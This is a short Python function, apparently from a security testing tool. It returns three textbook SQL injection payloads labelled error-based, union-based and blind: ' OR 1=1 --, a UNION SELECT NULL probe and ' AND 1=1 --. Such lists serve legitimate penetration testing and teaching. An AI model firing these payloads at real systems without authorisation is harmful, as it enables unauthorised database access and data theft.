def generate_sqli(db):
    return [
        {
            "type": "Error Based",
            "db": db,
            "payload": "' OR 1=1 --"
        },
        {
            "type": "Union Based",
            "db": db,
            "payload": "' UNION SELECT NULL,NULL --"
        },
        {
            "type": "Blind",
            "db": db,
            "payload": "' AND 1=1 -- (logic only)"
        }
    ]
